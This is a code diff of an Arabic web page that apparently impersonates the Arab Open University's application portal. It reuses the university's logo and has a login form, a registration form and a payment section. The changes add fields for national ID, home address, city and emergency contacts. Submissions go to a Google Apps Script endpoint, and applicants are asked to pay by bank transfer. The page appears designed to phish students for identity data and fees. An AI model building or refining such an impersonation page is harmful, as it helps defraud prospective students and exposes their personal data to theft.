@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>بوابة الخدمات الأكاديمية - الجامعة العربية المفتوحة</title>
+<title>الجامعة العربية المفتوحة – بوابة الخدمات الأكاديمية</title>
 <meta property="og:title" content="الجامعة العربية المفتوحة – بوابة الخدمات الأكاديمية">
 <meta property="og:description" content="التقديم الإلكتروني – تسجيل الدخول – الخدمات الأكاديمية للطلاب">
 <meta property="og:image" content="https://www.arabou.edu.sa/media/PublishingImages/new-logo.png">
@@ -11,62 +11,66 @@
 <meta name="twitter:card" content="summary_large_image">
 <link rel="icon" type="image/png" href="https://www.arabou.edu.sa/media/PublishingImages/new-logo.png">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
 <style>
 :root{
---primary-blue:#0b3d91;
+--uni-blue:#0054a6;
 --gold:#d4af37;
---bg:#ffffff;
---card:#f5f6f8;
+--bg:#f8faff;
+--card:#ffffff;
 --muted:#6b6b6b;
 }
 *{box-sizing:border-box;margin:0;padding:0;font-family:'Cairo',sans-serif;}
 body{background:var(--bg);color:#222;}
 a{text-decoration:none;color:inherit;}
 button{cursor:pointer;}
+.header-container{
+max-width:900px;margin:40px auto;text-align:center;padding:30px;background:linear-gradient(135deg,var(--uni-blue),#0073e6);border-radius:14px;color:#fff;box-shadow:0 10px 30px rgba(0,0,0,0.15);}
+.header-container img{width:100px;margin-bottom:12px;}
+.header-container h1{font-size:28px;margin-bottom:8px;}
+.header-container p{font-size:16px;margin-bottom:20px;}
 .login-container{
-max-width:500px;margin:50px auto;background:linear-gradient(135deg,var(--primary-blue),var(--gold));border-radius:14px;padding:30px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.15);}
-.login-header img{width:80px;margin-bottom:12px;}
-.login-header h1{color:#fff;font-size:24px;margin-bottom:6px;}
-.login-header p{color:#fff;font-size:16px;margin-bottom:20px;}
+max-width:500px;margin:30px auto;background:var(--card);border-radius:14px;padding:30px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.12);}
 .input-group{position:relative;margin-bottom:15px;}
 .input-group i{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:#555;}
-.input-group input{width:100%;padding:12px 12px 12px 36px;border-radius:10px;border:none;font-size:15px;}
-.login-btn{background:#fff;color:var(--primary-blue);padding:12px 24px;border:none;border-radius:10px;font-weight:700;font-size:16px;width:100%;display:flex;align-items:center;justify-content:center;gap:8px;}
+.input-group input{width:100%;padding:12px 12px 12px 36px;border-radius:10px;border:1px solid #ccc;font-size:15px;}
+.login-btn{background:var(--uni-blue);color:#fff;padding:12px 24px;border:none;border-radius:10px;font-weight:700;font-size:16px;width:100%;display:flex;align-items:center;justify-content:center;gap:8px;}
 .quick-access{margin-top:25px;}
-.quick-access h3{color:#fff;margin-bottom:12px;}
-.quick-links .quick-link{display:flex;align-items:center;gap:10px;justify-content:center;background:rgba(255,255,255,0.2);padding:10px;border-radius:10px;color:#fff;margin-bottom:10px;}
-.container-form{display:none;max-width:900px;margin:40px auto;background:#fff;border-radius:14px;box-shadow:0 10px 30px rgba(0,0,0,0.12);padding:30px;}
-.container-form header .logo{width:60px;height:60px;background:linear-gradient(135deg,var(--primary-blue),var(--gold));display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:20px;border-radius:10px;}
-.container-form header h1{color:var(--primary-blue);margin-bottom:6px;}
+.quick-access h3{color:var(--uni-blue);margin-bottom:12px;}
+.quick-links .quick-link{display:flex;align-items:center;gap:10px;justify-content:center;background:rgba(0,84,166,0.1);padding:10px;border-radius:10px;color:var(--uni-blue);margin-bottom:10px;}
+.container-form{display:none;max-width:900px;margin:40px auto;background:var(--card);border-radius:14px;box-shadow:0 10px 30px rgba(0,0,0,0.12);padding:30px;}
+.container-form header .logo{width:60px;height:60px;background:linear-gradient(135deg,var(--uni-blue),#0073e6);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:20px;border-radius:10px;}
+.container-form header h1{color:var(--uni-blue);margin-bottom:6px;}
 .container-form header p.subtitle{color:#666;margin-bottom:20px;}
 .grid2{display:grid;grid-template-columns:1fr 1fr;gap:20px;}
-label{display:block;margin-bottom:5px;font-weight:600;color:var(--primary-blue);}
+label{display:block;margin-bottom:5px;font-weight:600;color:var(--uni-blue);}
 input,select,textarea{width:100%;padding:10px;border:1px solid #ccc;border-radius:8px;margin-bottom:12px;}
 textarea{resize:vertical;}
 .section-title{font-weight:700;color:#444;margin:20px 0 10px;border-bottom:1px dashed #eee;padding-bottom:5px;}
 .submit-area{display:flex;gap:12px;justify-content:center;margin-top:15px;}
-.btn{background:var(--primary-blue);color:#fff;padding:12px 30px;border:none;border-radius:10px;font-weight:700;}
+.btn{background:var(--uni-blue);color:#fff;padding:12px 30px;border:none;border-radius:10px;font-weight:700;}
 .btn.cancel{background:#9e9e9e;}
-.toast{position:fixed;top:20px;right:20px;background:var(--primary-blue);color:#fff;padding:12px 18px;border-radius:8px;opacity:0;transform:translateY(-10px);transition:all .4s ease;z-index:999;}
+.toast{position:fixed;top:20px;right:20px;background:var(--uni-blue);color:#fff;padding:12px 18px;border-radius:8px;opacity:0;transform:translateY(-10px);transition:all .4s ease;z-index:999;}
 .toast.show{opacity:1;transform:translateY(0);}
 .payment-section{display:none;max-width:600px;margin:30px auto;background:#fff;border-radius:14px;box-shadow:0 10px 30px rgba(0,0,0,0.12);padding:30px;text-align:center;}
-.payment-section h2{color:var(--primary-blue);margin-bottom:15px;}
+.payment-section h2{color:var(--uni-blue);margin-bottom:15px;}
 .payment-section label{display:block;margin:8px 0 5px;}
 .payment-section input{width:100%;padding:10px;border-radius:8px;border:1px solid #ccc;margin-bottom:12px;}
 .payment-section .copy-btn{background:var(--gold);color:#fff;padding:6px 12px;border:none;border-radius:6px;margin-left:8px;cursor:pointer;}
-.success-message{display:none;text-align:center;padding:30px;background:#e0f5f9;border-radius:14px;color:var(--primary-blue);font-weight:700;margin:30px auto;}
+.success-message{display:none;text-align:center;padding:30px;background:#e0f5e9;border-radius:14px;color:var(--uni-blue);font-weight:700;margin:30px auto;}
 @media(max-width:900px){.grid2{grid-template-columns:1fr;}}
 </style>
 </head>
 <body>
 
-<div class="login-container">
-<header class="login-header">
+<div class="header-container">
 <img src="https://www.arabou.edu.sa/media/PublishingImages/new-logo.png" alt="شعار الجامعة العربية المفتوحة">
 <h1>الجامعة العربية المفتوحة</h1>
-<p>بوابة الخدمات الأكاديمية</p>
-</header>
+<p>بوابة الخدمات الأكاديمية – التقديم الإلكتروني للطلاب الجدد</p>
+<p>نرحب بكم في الجامعة العربية المفتوحة، حيث نقدم برامج تعليمية متميزة عن بعد وبالحضور وفق أعلى المعايير الأكاديمية.</p>
+</div>
 
+<div class="login-container">
 <form id="loginForm">
 <div class="input-group">
 <i class="fas fa-user"></i>
@@ -82,7 +86,7 @@ textarea{resize:vertical;}
 <div class="quick-access">
 <h3>وصول سريع</h3>
 <div class="quick-links">
-<a href="#" class="quick-link" onclick="showForm()">
+<a href="#" class="quick-link" id="openRegistration">
 <i class="fas fa-user-graduate"></i> تقديم طلب جديد
 </a>
 </div>
@@ -91,12 +95,12 @@ textarea{resize:vertical;}
 
 <!-- نموذج التقديم -->
 <div class="container-form" id="registrationForm">
-<form id="registrationFormForm" enctype="multipart/form-data" method="POST" action="https://script.google.com/macros/s/YOUR_GOOGLE_SCRIPT_URL_HERE/exec">
+<form id="registrationFormForm" enctype="multipart/form-data" method="POST" action="https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec">
 <header style="display:flex;align-items:center;gap:12px;margin-bottom:20px;">
 <div class="logo">AOU</div>
 <div>
 <h1>نموذج التسجيل - الجامعة العربية المفتوحة</h1>
-<p class="subtitle">يرجى تعبئة جميع الحقول الرسمية بدقة وإرفاق المستندات المطلوبة.</p>
+<p class="subtitle">يرجى تعبئة جميع الحقول بدقة وإرفاق الملفات المطلوبة.</p>
 </div>
 </header>
 
@@ -105,30 +109,35 @@ textarea{resize:vertical;}
 <label>الاسم الكامل *</label><input type="text" name="fullName" required>
 <label>الجنس *</label><select name="gender" required><option value="">اختر...</option><option>ذكر</option><option>أنثى</option></select>
 <label>الجنسية *</label><select name="nationality" required>
-<option value="">اختر...</option>
-<option>السعودية</option><option>اليمن</option><option>مصر</option><option>الإمارات</option>
-<option>الكويت</option><option>البحرين</option><option>عمان</option><option>قطر</option>
-<option>الأردن</option><option>سوريا</option><option>لبنان</option><option>السودان</option>
-<option>المغرب</option><option>تونس</option><option>أخرى</option></select>
+<option value="">اختر الجنسية</option>
+<option>السعودية</option><option>اليمن</option><option>مصر</option><option>سوريا</option><option>الأردن</option><option>العراق</option><option>لبنان</option><option>فلسطين</option><option>السودان</option><option>تونس</option><option>المغرب</option><option>الإمارات</option><option>الكويت</option><option>البحرين</option><option>عمان</option><option>قطر</option><option>تركيا</option><option>أفغانستان</option><option>باكستان</option><option>الهند</option><option>إندونيسيا</option><option>Other</option>
+</select>
+<label>الدولة (مكان الإقامة) *</label><select name="country" required>
+<option value="">اختر الدولة</option>
+<option>المملكة العربية السعودية</option><option>اليمن</option><option>مصر</option><option>الإمارات</option><option>الكويت</option><option>البحرين</option><option>عمان</option><option>قطر</option><option>الأردن</option><option>سوريا</option><option>لبنان</option><option>السودان</option><option>المغرب</option><option>تونس</option><option>أخرى</option>
+</select>
 <label>رقم الهوية / الإقامة *</label><input type="text" name="idNumber" required>
 <label>تاريخ الميلاد *</label><input type="date" name="birthDate" required>
+<label>المدينة *</label><input type="text" name="city" required>
+<label>العنوان *</label><textarea name="address" required></textarea>
 <label>رقم الجوال (واتساب) *</label><input type="tel" name="phone" required>
 <label>البريد الإلكتروني *</label><input type="email" name="email" required>
 </div>
 
 <div>
-<label>نوع المؤهل السابق *</label><select name="prevDegree" required><option value="">اختر...</option><option>ثانوي</option><option>دبلوم</option><option>بكالوريوس</option></select>
+<label>نوع المؤهل السابق *</label><select name="prevDegree" required><option value="">اختر...</option><option>ثانوي</option><option>دبلوم</option><option>بكالوريوس</option><option>ماجستير</option></select>
 <label>سنة التخرج *</label><input type="number" name="gradYear" required>
-<label>التخصص المطلوب *</label><input type="text" name="desiredMajor" required>
-<label>نوع الدراسة *</label><select name="studyType" required><option value="">اختر...</option><option>انتظام</option><option>انتساب</option><option>تعليم عن بعد</option></select>
-<label>الكلية / القسم *</label><select name="faculty" required>
-<option value="">اختر الكلية</option>
-<option>كلية إدارة الأعمال</option>
-<option>كلية العلوم</option>
-<option>كلية الآداب</option>
-<option>كلية الحاسبات وتقنية المعلومات</option>
-<option>كلية التربية</option>
+<label>اسم المدرسة / الجامعة السابقة</label><input type="text" name="prevInstitute">
+<label>النسبة / المعدل</label><input type="text" name="gpa">
+<label>التخصص المطلوب *</label><select name="desiredMajor" required>
+<option value="">اختر التخصص</option>
+<option>إدارة الأعمال</option><option>تكنولوجيا المعلومات</option><option>الهندسة</option><option>العلوم</option><option>الآداب</option><option>التربية</option><option>القانون</option>
 </select>
+<label>نوع الدراسة *</label><select name="studyType" required><option value="">اختر...</option><option>انتظام</option><option>تعليم عن بعد</option></select>
+<div class="section-title">جهة الاتصال في حالات الطوارئ</div>
+<label>اسم جهة الاتصال للطوارئ</label><input type="text" name="emergencyName" placeholder="اسم قريب أو شخص">
+<label>صلة القرابة</label><input type="text" name="emergencyRelation" placeholder="أم/ أب/ أخ/ صديق ...">
+<label>رقم الطوارئ</label><input type="tel" name="emergencyPhone" placeholder="رقم جوال للطوارئ">
 </div>
 </div>
 
@@ -153,7 +162,7 @@ textarea{resize:vertical;}
 </form>
 </div>
 
-<!-- صفحة السداد -->
+<!-- صفحة السداد بعد إرسال البيانات -->
 <div class="payment-section" id="paymentSection">
 <h2>صفحة السداد</h2>
 <label>اسم المحول:</label><input type="text" id="payerName" required>
@@ -180,9 +189,10 @@ textarea{resize:vertical;}
 <script>
 let hasSubmitted=false;
 
-function showForm(){
+document.getElementById('openRegistration').addEventListener('click',function(){
+if(hasSubmitted){showToast('❌ لقد تم إرسال بياناتك مسبقاً'); return;}
 document.getElementById('registrationForm').style.display='block';
-}
+});
 
 function copyAccount(){
 let copyText=document.getElementById('payerAccount');
@@ -235,4 +245,4 @@ document.getElementById('successMessage').style.display='block';
 </script>
 
 </body>
-  </html>
+                            </html>
